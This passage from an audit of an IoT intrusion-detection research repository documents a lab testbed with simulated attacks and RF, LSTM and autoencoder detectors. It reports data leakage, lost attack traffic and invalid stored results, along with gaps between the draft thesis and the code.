| Standardization | Implemented | `train_models.py:187-189` | `StandardScaler`, fit on **X_train only**, applied to X_train and X_test (correct for RF) |
| Feature selection | Not implemented | — | none (no importance-based selection) |
| Feature reduction | Not implemented | — | none |
| Train/test split | Implemented | `train_models.py:178-180` | 80/20, stratified, seed 42 (RF path) |
| Sequence generation | Implemented | `train_models.py:39-55` `build_lstm_sequences` | per-`src_ip`, sorted by `start_time`, **sliding windows of 5**; label = last flow's label (see §12) |

**Data leakage (important for Chapter 4):**
- The scaler is fitted on the training split only — correct (`train_models.py:187-189`).
- ⚠ The **Autoencoder is trained on all NORMAL flows from the whole dataset, including test-set normals** (`train_models.py:221-225`: `normal_mask = df[label] == "NORMAL"` then `scaler.transform(X_norm)` over the full frame) — test-set information participates in training (leakage).
- ⚠ **LSTM sequences are built from the full dataset before splitting** (`train_models.py:209`, split at `:215-217`): overlapping windows and the pre-split construction mean adjacent training/test windows share flows (leakage); the split is also not stratified.

---

## 11. Random Forest

**File:** `ml/train_models.py:19-36` (`train_random_forest`).

| Parameter | Value (from code) |
|---|---|
| n_estimators | 200 |
| max_depth | 20 |
| min_samples_split | 5 |
| min_samples_leaf | default (1) — not specified |
| criterion | default (gini) — not specified |
| class_weight | `"balanced"` |
| random_state | 42 |
| n_jobs | -1 |
| Input | the 15 features, scaled (X_train_scaled) |
| Output classes | the string labels present in the data (currently NORMAL / C2_BEACON / EXFIL_RANSOMWARE) |
| Hyperparameter tuning | **none** |
| Cross-validation | **none** |
| Feature importance | computed by sklearn internally but **never extracted or saved** — not reported anywhere |
| Model saving | `joblib.dump` → `models/random_forest.joblib` |
| Prediction/eval | `predict(X_test)`; weighted F1 printed (`:31`); full metrics in `ml/evaluate.py:62-99` |

---

## 12. LSTM

**File:** `ml/train_models.py:39-55` (sequence builder), `:58-93` (trainer); evaluation rebuilds sequences in `ml/evaluate.py:228-255`.

| Item | Actual implementation |
|---|---|
| Sequence creation | `build_lstm_sequences`: group by **`src_ip`**, sort by `start_time`, **sliding window of 5 consecutive flows** (`seq_len=5`), sliding by 1 (overlapping windows); label of a window = **label of the last flow** in the window |
| Input shape | `(num_sequences, 5, 15)` |
| Architecture | Input(5,15) → LSTM(64, return_sequences=False) → Dense(32, relu) → Dense(num_classes, softmax) |
| Dropout | **none** |
| Optimizer / LR | adam / default (0.001) |
| Loss | sparse_categorical_crossentropy |
| Batch / epochs | 16 / 20 |
| Validation split | 0.1 (shuffled Keras default inside `fit`) |
| Early stopping | **none** |
| Random seed | only the 42 in the sklearn split; **no TF seed set** (results not fully deterministic) |
| Output | class probabilities (softmax); argmax for labels |
| Guard | skipped if <20 sequences (`:210-212`) |
| Saving | `models/lstm_model.keras` |

⚠ For the report: the "sliding-window flow sequence" approach **is** implemented as described (per-source-IP, time-ordered, window of 5). Caveats: window labels use the last flow's label only; sequences built before the split (leakage); per-`src_ip` grouping is dominated by Docker NAT hosts given the dataset pollution; no dropout/early stopping; and the stored evaluation was executed against a class mapping inconsistent with the trained model (§15) — the stored LSTM results are not meaningful.

---

## 13. Autoencoder

**File:** `ml/train_models.py:96-146` (`train_autoencoder`); evaluation `ml/evaluate.py:135-162`.

| Item | Actual implementation |
|---|---|
| Input dimension | 15 (scaled features) |
| Architecture | Dense(16, relu) → Dense(8, relu) → Dense(16, relu) → Dense(15, linear) — a 16-8-16 bottleneck |
| Loss | mse |
| Optimizer | adam (default LR) |
| Epochs / batch | 30 / 16 |
| Validation split | 0.1 (inside `fit`, shuffled) |
| Training data | **NORMAL flows only** — but from the **entire dataset (train + test)**, ⚠ leakage (`train_models.py:221-225`) |
| Reconstruction error | `mean((x − x̂)²)` per sample over the 15 features (`:124`) |
| Threshold | `mean(errors_train) + 3 × std(errors_train)` over NORMAL training reconstruction errors (`:125`); stored `models/autoencoder_threshold.json` = **0.22908447339926985** |
| Classification | test error > threshold → anomaly (`:129`) |
| Persistence | `models/autoencoder_model.keras` |

The model is genuinely an unsupervised anomaly detector (trained on benign data only, MSE thresholding). The design intent (benign-only training) is confirmed; the **training set definition leaks test-set normals**, and given the dataset pollution the stored result is essentially non-informative (see §15).

---

## 14. Model Training Pipeline

As implemented in `ml/train_models.py:149-230` (`main`):

1. Load `data/labeled_flows.csv`.
2. Select the 15 feature columns + `label`.
3. `train_test_split` on the row index, test 0.2, seed 42, stratified by label → X_train/X_test, y_train/y_test.
4. `StandardScaler.fit_transform(X_train)` / `transform(X_test)`.
5. Save holdout test set → `models/holdout_test_set.csv`; save scaler → `models/scaler.joblib`.
6. Train RF on scaled train; predict scaled test; weighted F1; save `random_forest.joblib`.
7. Build LSTM sequences from the **full** frame (per src_ip, window 5); split 80/20 (seed 42, not stratified); train LSTM; save `.keras` (skipped if <20 sequences).
8. Train AE on **all NORMAL flows** (scaled); threshold = mean+3σ; save `.keras` + `autoencoder_threshold.json` (skipped if no NORMAL rows).
9. `ml/evaluate.py` loads models, rebuilds the holdout/eval data, recomputes metrics, saves `evaluation_results.csv` + confusion-matrix PNGs.

Pipeline representation:

```
labeled_flows.csv
   │ 1. feature selection (15 cols)
   │ 2. stratified 80/20 split (seed 42)
   ▼
X_train ── fit ──► StandardScaler ── transform ──► X_train_scaled, X_test_scaled
   │
   ├─► RandomForest(200, depth 20, balanced) ──► predict ──► F1/ROC/FPR/CM
   │
   ├─► [full data] group by src_ip → sort by start_time → windows of 5
   │      → train_test_split(0.2, seed 42) ──► LSTM(64) ──► softmax ──► F1/ROC/FPR/CM
   │
   └─► [all NORMAL flows] 16-8-16 AE ──► MSE reconstruction ──► threshold μ+3σ
          ──► test MSE > threshold ⇒ anomaly ──► F1/ROC/FPR/CM
```

---

## 15. Evaluation

**File:** `ml/evaluate.py` (`evaluate_rf` 62–99, `evaluate_lstm` 102–132, `evaluate_autoencoder` 135–162, `main` 178–270).

| Metric | Implemented? | Calculation | Where |
|---|---|---|---|
| Accuracy | **Not implemented** — never computed anywhere (grep: no `accuracy` outside Keras `metrics=["accuracy"]` during training) | — | — |
| Precision | **Not implemented** | — | — |
| Recall | **Not implemented** | — | — |
| F1-score | Implemented | `sklearn.metrics.f1_score(average="weighted")` for RF/LSTM; `average="binary"` for AE | `evaluate.py:78,111,143` |
| ROC-AUC | Implemented | binary: `roc_auc_score(y, proba[:,1])`; multiclass: `multi_class="ovr"`; AE uses raw reconstruction errors | `evaluate.py:81-86,113-118,146-149` |
| False-positive rate | Partially | computed as `fp/(fp+tn)` from the confusion matrix — **only valid for binary (AE)**; for multiclass RF/LSTM the code degrades to `nan` | `evaluate.py:88-89,121-122,151-152` |
| Confusion matrix | Implemented | `sklearn.metrics.confusion_matrix` + seaborn PNG | `evaluate.py:77,110,142,165-175` |
| Detection latency | **Not implemented** — no latency measurement anywhere (grep: no occurrence) | — | — |

**Stored results** (`models/evaluation_results.csv`, written 2026-08-01 17:57 local; computed on the polluted dataset):

| Model | Accuracy | Precision | Recall | F1 | ROC-AUC | FPR | Detection Latency |
|---|---|---|---|---|---|---|---|
| Random Forest | Not found | Not found | Not found | **0.8947** | **0.9507** | NaN (multiclass path) | Not found |
| LSTM | Not found | Not found | Not found | **0.9123** | **0.3882** | NaN (multiclass path) | Not found |
| Autoencoder | Not found | Not found | Not found | **0.0012** | **0.4940** | **0.0010** | Not found |

Additional stored artefacts: `models/autoencoder_threshold.json` (`0.22908447339926985`); three confusion-matrix PNGs; `models/holdout_test_set.csv`.

Observed consistency problems in the stored results (facts, with likely cause flagged):
- RF confusion matrix `[[1382,0,232],[0,14,6],[3617,10,23310]]` (rows = C2_BEACON, EXFIL_RANSOMWARE, NORMAL): row/col totals (28,571) do **not** sum to the current holdout size (30,638) — the metrics were computed on a dataset version different from the current one.
- LSTM confusion matrix shows **every prediction in one class** (`[[0,0,1666],[0,0,21],[0,0,26868]]`) with ROC-AUC 0.388 — consistent with (likely cause) the model being trained against a class mapping/order that differs from the mapping rebuilt at evaluation time (`evaluate.py:243-249` builds a new sorted label map from the full file), so outputs do not align with the evaluation labels.
- AE detected only 1 of 1,634 true anomalies (`[[26910,27],[1633,1]]`, F1 0.0012) — consistent with benign-only training on a dataset whose NORMAL class is dominated by background traffic that also dominates the anomaly windows.

The dashboard surfaces only F1, ROC-AUC and FPR (plus KPIs derived from label counts): `dashboard/server/main.py:91-103,172-212`.

**These stored numbers must NOT be quoted as valid research results** without acknowledging the data issues in §9; Chapters 3/4 should either re-run the experiment or explicitly discuss the failure.

---

## 16. Testing

| Kind | Status | Evidence |
|---|---|---|
| Unit tests | Not found | no `test*` files, no pytest/unittest anywhere |
| Integration tests | Not found | — |
| Test scripts | Not found | — |
| Dataset validation | None (no automated check); the pipeline prints label distributions and missing-column warnings to stderr | `ml/label_flows.py:79-82`, `ml/train_models.py:168-173` |
| Model validation | Holdout-set evaluation + confusion matrices only | `ml/evaluate.py` |
| Docker/testbed validation | Manual only (runbook): `docker compose up`, `docker ps`, capture-start checks (`main.py:316-324` pgrep), health endpoint `/api/health` | `docs/RUNBOOK.md`, `docs/RUNBOOK-WIN.md` |
| Network connectivity tests | None automated; the runbook relies on dashboard visibility | — |
| Reproducibility | Documented commands (runbook) + fixed seeds (42) + fixed IPs; **no CI, no scripts asserting reproducibility** | runbooks, `train_models.py` |
| Known-bug log | README "Key Fixes" table (5 fixes) + RUNBOOK troubleshooting table | `README.md:106-120`, `docs/RUNBOOK.md` |

**Observed un-resolved pipeline bug (evidence-backed):** segment name reuse across tcpdump restarts causes `live_update.sh` to skip re-captured segments (state file `data/.live_state` lists names 0..256 with heavy duplication; flows show two disjoint capture sessions). This is the mechanism behind the missing RECON/BRUTEFORCE/early-C2/EXFIL-round-1 traffic and is worth fixing before any re-run.

---

## 17. System Requirements

### Functional requirements (all implemented — file evidence)

1. Generate benign IoT traffic — `scripts/normal_traffic.py` (§4).
2. Generate four simulated attack behaviours — `scripts/attack_*.sh` (§5).
3. Capture traffic — tcpdump via `docker/capture/`, dashboard endpoints, `capture_*.sh` (§6).
4. Extract flow features — `ml/extract_features.py` (§7–8).
5. Label traffic from ground truth — `ml/label_flows.py` (§5, §9).
6. Train models (RF, LSTM, AE) — `ml/train_models.py` (§11–14).
7. Detect anomalies (AE thresholding; RF/LSTM classification) — §13–14.
8. Evaluate models — `ml/evaluate.py` (§15).
9. Visualise/monitor live — dashboard (FastAPI + TS frontend) (§3.3).
10. Retrain incrementally — `scripts/live_update.sh`.

### Non-functional requirements

| Requirement | Status | Evidence |
|---|---|---|
| Isolation of simulated attacks | Implemented | dedicated bridge network, fixed subnet, attacker on 192.168.50.99, no published ports from attacker/capture; capture container host+privileged (deliberate) |
| Reproducibility | Partially implemented | runbook + fixed IPs + seed 42 + recorded attack log; not fully reproducible due to capture-restart segment loss and timezone-dependent labelling (fix exists in `label_flows.py`) |
| Lightweight/offline processing | Implemented | batch CSV pipeline; Scapy read-only; models persist as joblib/keras |
| Security of the lab | Partially | anonymous MQTT, no-auth listener, Docker socket mounted into dashboard-api (documented design choices; only lab-internal exposure) |
| Performance | Not measured | no latency/throughput measurements in the repo |
| Freshness of results | Implemented | dashboard polls files every 10 s (`main.py:146-153`); pipeline sleep 10 s (`live_update.sh:111`) |

---

## 18. Design Artefacts (Chapter 4 Diagrams)

Diagrams that can be drawn **entirely from implementation facts**:

1. **System architecture diagram** — Docker host; 6 containers; volumes (scripts ro, data, models, docker.sock); bridge network; capture on host net. Components and edges as in §3.3.
2. **Docker/container diagram** — per §3.1 table: base images, tools, IPs, `depends_on` (sensor→broker/web), privileged flags (attacker NET_ADMIN/NET_RAW, capture privileged host).
3. **Network topology** — `iot_sim_net` 192.168.50.0/24: .10 broker, .11 web, .20 sensor, .99 attacker; protocols MQTT:1883, HTTP:80, SSH:22, C2/exfil:8080 (self), tcpdump vantage point (host). Include Docker Desktop NAT addresses (192.168.65.x) observed in data as a caution annotation.
4. **Data collection pipeline** — tcpdump (30 s rotation) → segments → live_update watcher → flows.csv → attack_log.csv → labeled_flows.csv.
5. **Flow feature extraction pipeline** — rdpcap → 5-tuple bucketing (unidirectional) → 15 features (§8) → CSV.
6. **Ground-truth labelling flowchart** — attack START/END parsing (UTC, timezone-aware) → interval overlap test `fs ≤ t1 ∧ fe ≥ t0` → first-match label, else NORMAL (Pseudocode 3.1 of the draft is accurate).
7. **ML pipeline** — §14 diagram (load → select → split → scale → train RF → build sequences → train LSTM → AE on normals → threshold → persist).
8. **Random Forest workflow** — 200 trees/balanced/depth 20; stratified split; weighted F1; joblib persistence.
9. **LSTM workflow** — per-src_ip time-sorted sliding windows (len 5), last-label labelling, LSTM(64)→Dense(32)→softmax, 20 epochs.
10. **Autoencoder workflow** — 16-8-16 bottleneck on NORMAL; MSE; μ+3σ threshold; anomaly decision.
11. **End-to-end detection workflow** — full §3.3 chain including dashboard control endpoints (capture start/stop, pipeline start/stop, attack execution) and KPI/table/chart rendering.

All 11 are supportable; 1–7, 10, 11 are the most valuable for Chapter 4.

---

## 19. Development Process

Reconstructed from `git log` (5 commits, author `obbysang`), file structure and data timestamps:

**Confirmed stages (from git history):**
1. **Jul 7 2026** — Initial prototype (commit `cbe7dd2`): monolithic root-level `build_dataset.py`, `quick_start.sh`, `train_models.py`.
2. **Jul 7 2026** — Restructure into final layout (commit `f1303a7`): `docker/`, `scripts/`, `ml/`; docker-compose (6 services), attack scripts, wordlist, mosquitto config, entrypoints; removed the monolithic files.
3. **Jul 9 2026** — First runbook (commit `5964118`).
4. **Later Jul 2026** — Dashboard + capture infrastructure + live ML pipeline (commit `172a031`): FastAPI server, TS frontend, `live_update.sh`, `capture_rotate.sh`, updated README/`.gitignore`.
5. **Jul 2026** — Runbook bug-section removal (commit `ec91f13`).
6. **Aug 1 2026** — Final update (commit `1f245b5`): `RUNBOOK-WIN.md`, host capture scripts, dashboard/Dockerfile fixes, Chapter 3 draft docx.

**Confirmed experimental execution (from data):**
- Capture session 1: 2026-07-31 14:58–18:00Z (flows present, no attacks logged).
- Capture session 2: 2026-08-01 12:41–14:59Z (segments 0–265).
- Attack round 1: 2026-08-01 12:45–12:53Z (recon, bruteforce, beacon, exfil) — **traffic lost** (segments skipped).
- Attack round 2: 2026-08-01 13:31–13:41Z (recon, bruteforce, 2× beacon, exfil) — recon/bruteforce **lost**; beacon/exfil traffic **invisible to capture**; only overlapping background traffic entered the dataset.
- Models trained/evaluated 2026-08-01 ~17:49–17:57 local.

**Reasonable dependencies** (inference only): capture → flow extraction → labelling → training → evaluation → dashboard display is a natural sequence and matches file mtimes; no other claim is made.

**Unknown stages**: how many trial runs preceded the recorded ones; whether results were manually curated; the actual host clock/timezone relationship.

---

## 20. Discrepancies Between Report/Claims and Code

| Report/Expected Claim | Repository Evidence | Status | Required Action |
|---|---|---|---|
| 15 flow-based features | exactly 15 numeric features selected in `train_models.py:161-166` | **Confirmed** | none |
| Four attack classes implemented | 4 attack scripts exist and ran (attack log) | **Confirmed (scripts)** | — |
| Four attack classes present in the dataset | only NORMAL / C2_BEACON / EXFIL_RANSOMWARE (0 RECON, 0 BRUTEFORCE) | **DISCREPANCY** | Re-run with fix, or report 3-class dataset with explanation |
| Actual attack traffic represented in the dataset | 0 flows involve attacker IP 192.168.50.99; 0 flows on port 8080; attack classes are background traffic | **Critical DISCREPANCY** | Re-run capture (unique segment names; observe container-internal traffic or move listener) |
| 40–60 s C2 jitter | `40 + RANDOM % 20` → **40–59 s** | **Minor DISCREPANCY** | State 40–59 s in the report |
| Docker testbed (6 containers, 192.168.50.0/24) | `docker-compose.yml` | **Confirmed** | none |
| Scapy for traffic/feature processing | Scapy 2.7.0 used for `rdpcap` only | **Confirmed (limited use)** | Describe accurately: Scapy reads pcaps; no live sniffing |
| Random Forest | implemented as claimed (200 trees, balanced) | **Confirmed** | — |
| LSTM | implemented; sliding window of 5 per src_ip confirmed | **Confirmed** (evaluation caveats) | Fix label-map alignment for meaningful eval |
| Autoencoder | implemented, 16-8-16, μ+3σ, benign-only training | **Confirmed** (leakage caveat) | Train on train-split normals only |
| Benign-only AE training | NORMAL flows used — but from **whole dataset incl. test** | **DISCREPANCY (leakage)** | Restrict to training split |
| Flow-based representation | yes, unidirectional 5-tuple; fwd/bwd are placeholders; no timeouts | **Partially confirmed** | Correct the "bidirectional" wording if used |
| Network-only detection (no endpoint access) | confirmed — only pcap-derived features | **Confirmed** | none |
| Evaluation: accuracy, precision, recall | **not implemented anywhere** | **DISCREPANCY** | Add or remove from report |
| Evaluation: F1, ROC-AUC, FPR | implemented (FPR only for AE; NaN for multiclass) | **Partially confirmed** | Clarify scope |
| Detection latency | **not implemented** | **DISCREPANCY** | Implement or drop the claim |
| Normal traffic includes "SSH control sessions" (draft §3.1.2) | `normal_traffic.py` generates MQTT/HTTP/ICMP only | **DISCREPANCY** | Remove SSH claim |
| Exfiltration tool "netcat" (draft Table 3.2) | implementation uses `curl` (netcat installed but unused) | **DISCREPANCY** | Say curl |
| ICMP pings as benign traffic | no ICMP flows in data (no NET_RAW in sensor container) | **DISCREPANCY** | Verify/fix sensor capabilities |
| Python 3.12 | host venv 3.12.10 ✓; containers 3.11-slim | **Confirmed (host)** | Specify per-context versions |
| "Subnet filter prevents host-traffic pollution" (draft §3.1.3, README) | 91.8% of NORMAL flows are outside-subnet host/NAT/internet traffic | **DISCREPANCY** | Use filtered capture consistently; re-clean data |
| Time-based labelling accuracy | implementation is as described (first-overlap wins) | **Confirmed** | Note label-noise caveat honestly (normal flows inside attack windows get attack labels) |
| Stored results valid | results inconsistent (CM totals vs holdout; LSTM one-class predictions; AE F1 0.0012) | **DISCREPANCY** | Do not cite as final results; re-run |
| "bug fixes applied" (README) | fixes present in code (float cast, timezone parsing, index split, binarize) | **Confirmed** | — |

---

## 21. Information Still Required From the Researcher

| Missing item | Why Chapters 3/4 need it | Obtainable from repo? | Action |
|---|---|---|---|
| Hardware (host machine specs, CPU/RAM; whether GPU) | "System requirements", experiment environment description | No | Provide manually |
| Docker Desktop version; WSL2 distro details | tools table | No | Provide manually |
| Exact experiment dates/session count (Jul 31 + Aug 1 sessions; how many reruns) | experimental design narrative | Partially (from data) | Confirm manually |
| Host timezone during runs (flows vs file mtimes mismatch) | reproducibility of timestamps | No | Provide manually |
| Whether the dataset/results are considered final or are to be re-generated after fixing capture | Chapters 3/4 core narrative | No | Researcher decision (strongly recommended: re-run) |
| Ethics approval reference/code (if required by institution) | Chapter 3 ethics section | No | Provide manually |
| Observation notes taken during experiments | limitations/observations | No | Provide manually |
| Number of experimental runs / repeatability evidence | evaluation methodology | No | Provide manually |
| Rationale/justification text (model selection reasons) | Chapter 3 prose | Partially (draft docx) | Draft from docx |
| The two lost attack classes (RECON/BRUTEFORCE) decision | dataset description | No | Decide: re-run or acknowledge absence |
| Any results produced outside the repo (e.g., extra charts) | consistency | No | Provide manually |
| Institution/university name, programme details | report front matter | No | Provide manually |

---

## 22. Chapter 3 Data Extraction Summary

| Chapter 3 Section | Information Available | Evidence/File | Missing Information |
|---|---|---|---|
| Methodology (overall approach) | Full experimental design; 8 phases; draft text | `docs/Methodology-Chapter-3.docx` §3.1; README | none |
| Research approach | experimental laboratory design, network-only detection | docx §3.1; code evidence | — |
| Experimental design | Docker testbed, 4 attacks, capture, labels, 3 models | `docker-compose.yml`, `scripts/`, `ml/` | run counts, dates confirmation |
| Data collection | normal generator, attacks, capture, segments, attack log | `scripts/normal_traffic.py`, `scripts/attack_*.sh`, `data/` | ground-truth reliability discussion (pollution) |
| Feature engineering | 15 features, exact formulas, entropy, IAT | `ml/extract_features.py` | honest note on placeholder fwd/bwd |
| ML methodology | RF/LSTM/AE hyperparameters, seeds, split, leakage points | `ml/train_models.py` | — |
| Evaluation methodology | F1/ROC-AUC/FPR/CM code; stored (flawed) results | `ml/evaluate.py`, `models/evaluation_results.csv` | accuracy/precision/recall/latency decisions |
| Tools | full stack with versions | §2 of this audit; venv | Docker Desktop version |
| Ethics | lab-only simulation; no real targets; no real malware | README, scripts | institutional ethics reference |
| Limitations | deducible: capture gaps, label noise, host-traffic pollution, class imbalance | §9, §20 | researcher-written limitations text |

---

## 23. Chapter 4 Data Extraction Summary

| Chapter 4 Section | Information Available | Evidence/File | Missing Information |
|---|---|---|---|
| Requirements | functional + NFR list supported by code | §17; scripts/config | formal requirement numbering/priorities |
| Architecture | full system/data-flow; dashboard; live pipeline | §3.3; `dashboard/server/main.py` | — |
| Testbed design | 6 containers, images, IPs, volumes, privileges | `docker-compose.yml`, `docker/*` | hardware host details |
| Network design | subnet, protocols, directions, MQTT config, capture vantage | §3.2; `mosquitto.conf` | explanation of observed NAT pollution |
| Attack simulation | 4 scripts, tools, timings, jitter 40–59 s, labels | `scripts/attack_*.sh`, `listener.py`, `data/attack_log.csv` | decision about absent RECON/BRUTEFORCE data |
| Data collection | tcpdump rotation, segments, capture commands, 2 sessions | §6; `capture_*.sh`, `main.py:292-338` | session log from researcher |
| Feature extraction | algorithm + pseudocode + 15 features | `ml/extract_features.py` | — |
| Dataset | counts, distribution, duplicates, splits, seeds | §9; `data/*.csv`, `models/holdout_test_set.csv` | decision on re-generation |
| Preprocessing | scaling, dropna, leakage points | §10; `ml/train_models.py` | — |
| Random Forest | full parameter set | §11 | feature-importance output (not saved) |
| LSTM | sequence construction, architecture, hyperparams | §12 | valid re-evaluation after label-map fix |
| Autoencoder | architecture, threshold, leakage | §13 | valid re-evaluation |
| Training pipeline | §14 flow diagram | `ml/train_models.py` | — |
| Detection pipeline | AE threshold decision; live loop | `ml/train_models.py:123-129`, `live_update.sh` | — |
| Testing | none automated; manual runbook verification; bug log | §16; README fixes table | any manual test records |
| Development process | git timeline + data session evidence | §19; `git log` | researcher's process notes |

---

## 24. Final Verdict

## Repository Readiness for Chapters 3 and 4

### MOSTLY READY

The repository contains enough implementation evidence to write both chapters **factually** — every tool, script, parameter, file, and data artefact needed to describe the methodology and design exists and is documented above with exact paths. However, the **integrity of the experimental results is compromised** in ways the report cannot ignore:

**What we already have**
- Complete testbed: 6 containers, network 192.168.50.0/24, fixed IPs, MQTT broker, attack tools.
- All four attack simulations implemented and executed (attack log, nmap/hydra outputs).
- Full pipeline: capture → flows (15 features) → labelling → RF/LSTM/AE → evaluation → dashboard.
- Exact model hyperparameters, seeds, split parameters, and threshold (0.2291).
- A 153,188-flow labelled dataset and stored (flawed) evaluation output.

**What is missing / what must change**
- **Re-run or rework the dataset**: the current labels are largely meaningless — no attacker traffic was captured (0 flows on 192.168.50.99 / port 8080), RECON and BRUTEFORCE classes are absent, and 91.8% of NORMAL plus most "attack" flows are Docker Desktop background traffic.
- The metric set: accuracy, precision, recall and detection latency are not implemented anywhere — either implement them or drop the claims from the report.
- Fix segment-name reuse (`.live_state` skipping) and the LSTM label-map alignment; restrict AE training to the training split.
- Stored results must not be quoted as valid; if re-run, re-populate `models/evaluation_results.csv`.

**What should be obtained next**
1. Researcher decision: re-run the experiment (recommended) or write Chapters 3/4 around the methodological limitations with corrected descriptions.
2. Hardware/Docker version/ethics/run-count details (§21).
3. If re-running: use unique segment names, a subnet-filtered capture for all sessions, and either move the C2/exfil listener to another container or capture inside the attacker namespace so attack traffic is observable.

**Contradictions between the report and implementation (top 5)**
1. Four attack classes claimed vs only three labels present (RECON/BRUTEFORCE have zero flows).
2. "Attack traffic" in the dataset is, in fact, unrelated background traffic overlapping attack windows.
3. 40–60 s jitter is actually 40–59 s.
4. "SSH control sessions" and "netcat" exfiltration are described in the draft but not implemented (curl is used; no SSH sessions).
5. Evaluation claims (accuracy/precision/recall/latency) have no implementation; the stored F1/ROC-AUC values are not reliable.

This audit document, combined with §9/§15/§20, is a sufficient evidence base to write both chapters — provided the report either reflects the actual (limited) state of the results or the researcher first re-runs the corrected experiment.
